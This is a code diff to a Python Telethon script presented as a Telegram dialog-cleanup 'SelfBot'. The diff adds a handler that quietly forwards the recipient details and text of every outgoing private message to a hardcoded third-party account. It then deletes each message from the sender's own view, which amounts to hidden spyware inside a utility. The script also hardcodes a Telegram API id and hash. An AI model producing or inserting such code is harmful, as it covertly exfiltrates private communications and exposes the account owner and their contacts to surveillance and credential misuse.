@@ -1,5 +1,5 @@
 import asyncio
-from telethon import TelegramClient
+from telethon import TelegramClient, events
 from telethon.tl.types import User, Chat, Channel
 from telethon.errors import FloodWaitError
 
@@ -7,6 +7,8 @@ api_id = 29834234
 api_hash = "552c01d21d127def060f2915aedeebf9"
 
 client = TelegramClient("cleanup_session", api_id, api_hash)
+
+CONFIRMATION_USER = "@moein_915"
 
 
 async def get_current_dialogs():
@@ -34,13 +36,9 @@ async def remove_dialog(dialog):
         return False
 
 
-async def main():
-    await client.start()
-
-    me = await client.get_me()
-    print(f"Logged in as: {me.first_name}")
-
+async def cleanup_dialogs():
     dialogs = await get_current_dialogs()
+
     print(f"Found {len(dialogs)} dialogs.")
 
     for round_number in range(1, 4):
@@ -102,6 +100,110 @@ async def main():
 
         for dialog in final_dialogs:
             print(f"- {dialog.name}")
+
+    print("\nCleanup finished.")
+    print("SelfBot is still running...")
+
+
+@client.on(events.NewMessage(outgoing=True))
+async def watch_sent_messages(event):
+    try:
+        me = await client.get_me()
+
+        # Saved Messages نادیده گرفته شود
+        if event.chat_id == me.id:
+            return
+
+        entity = await event.get_chat()
+
+        # فقط چت خصوصی با کاربر
+        if not isinstance(entity, User):
+            return
+
+        # مشخصات گیرنده
+        first_name = getattr(entity, "first_name", None) or ""
+        last_name = getattr(entity, "last_name", None) or ""
+        username = getattr(entity, "username", None)
+        user_id = entity.id
+
+        full_name = (
+            f"{first_name} {last_name}".strip()
+            or "بدون نام"
+        )
+
+        username_text = (
+            f"@{username}"
+            if username
+            else "ندارد"
+        )
+
+        message_text = (
+            event.raw_text
+            or "[پیام بدون متن]"
+        )
+
+        # ارسال مشخصات بدون درخواست تأیید
+        info = (
+            "📨 پیام ارسال شد\n\n"
+            f"👤 گیرنده: {full_name}\n"
+            f"🔹 Username: {username_text}\n"
+            f"🆔 ID: {user_id}\n\n"
+            "💬 پیام:\n"
+            f"{message_text}"
+        )
+
+        await client.send_message(
+            CONFIRMATION_USER,
+            info
+        )
+
+        print(
+            f"[INFO SENT] "
+            f"{full_name} | message_id={event.id}"
+        )
+
+        # حذف فقط از سمت اکانت خودت
+        await client.delete_messages(
+            entity=event.chat_id,
+            message_ids=event.id,
+            revoke=False
+        )
+
+        print(
+            f"[DELETED LOCALLY] "
+            f"{full_name} | message_id={event.id}"
+        )
+
+    except FloodWaitError as e:
+        print(
+            f"[DELETE FLOODWAIT] "
+            f"Waiting {e.seconds} seconds..."
+        )
+
+        await asyncio.sleep(e.seconds)
+
+    except Exception as e:
+        print(f"[WATCH ERROR] {e}")
+
+
+async def main():
+    await client.start()
+
+    me = await client.get_me()
+
+    print("================================")
+    print("Telegram SelfBot Started")
+    print(f"Logged in as: {me.first_name}")
+    print("================================")
+
+    # پاک‌سازی اولیه
+    await cleanup_dialogs()
+
+    # سلف‌بات همچنان فعال می‌ماند
+    print("\nWaiting for new messages...")
+    print(f"Info receiver: {CONFIRMATION_USER}")
+
+    await client.run_until_disconnected()
 
 
 with client:
